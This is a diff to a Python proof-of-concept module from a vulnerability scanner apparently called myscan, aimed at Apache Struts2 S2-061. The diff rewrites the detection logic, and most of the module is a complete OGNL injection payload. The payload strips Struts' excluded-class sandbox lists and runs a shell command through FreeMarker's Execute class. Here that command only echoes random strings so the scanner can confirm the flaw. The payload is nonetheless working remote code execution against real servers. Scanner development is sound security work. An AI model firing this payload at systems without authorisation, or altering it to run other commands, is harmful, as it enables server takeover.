@@ -4,7 +4,7 @@
 # @File    : myscan_struts2_061.py
 
 
-from myscan.lib.core.common import get_random_str
+from myscan.lib.core.common import get_random_str, check_echo
 from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
 from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
 from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
@@ -21,33 +21,29 @@ class POC():
 
     def verify(self):
         # 添加限定条件
-        if self.dictdata.get("url").get("extension").lower() not in ["do", "action",""]:
+        if self.dictdata.get("url").get("extension").lower() not in ["do", "action", ""]:
             return
         self.parser = dictdata_parser(self.dictdata)
         params = self.dictdata.get("request").get("params").get("params_url") + \
                  self.dictdata.get("request").get("params").get("params_body")
-        random_str = get_random_str(8)
+        rs1 = get_random_str(4)
+        rs2 = get_random_str(4)
+        random_str = "{} {}".format(rs1, rs2)
         if params:
             for param in params:
-                req = self.parser.getreqfromparam(param, "w", random_str)
-                r = request(**req)
-                if r is not None and random_str.encode() in r.content:
-                    payload = '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("echo ''' + random_str + '''")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'''
-                    req = self.parser.getreqfromparam(param, "w", payload)
-                    r1 = request(**req)
-                    if r1 != None:
-                        nums = r.content.count(random_str.encode())
-                        if nums == r1.content.count(random_str.encode()) and nums != r1.content.count(
-                                "echo".encode()):
-                            parser_ = response_parser(r1)
-                            self.result.append({
-                                "name": self.name,
-                                "url": parser_.geturl().split("?")[0],
-                                "level": self.level,  # 0:Low  1:Medium 2:High
-                                "detail": {
-                                    "vulmsg": self.vulmsg,
-                                    "commond": "echo {}".format(random_str),
-                                    "request": parser_.getrequestraw(),
-                                    "response": parser_.getresponseraw(),
-                                }
-                            })
+                payload = '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("echo ''' + random_str + '''")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'''
+                req = self.parser.getreqfromparam(param, "w", payload)
+                r1 = request(**req)
+                if r1 is not None and check_echo(r1.content, rs1, rs2):
+                    parser_ = response_parser(r1)
+                    self.result.append({
+                        "name": self.name,
+                        "url": parser_.geturl(),
+                        "level": self.level,  # 0:Low  1:Medium 2:High
+                        "detail": {
+                            "vulmsg": self.vulmsg,
+                            "commond": "echo {}".format(random_str),
+                            "request": parser_.getrequestraw(),
+                            "response": parser_.getresponseraw(),
+                        }
+                    })
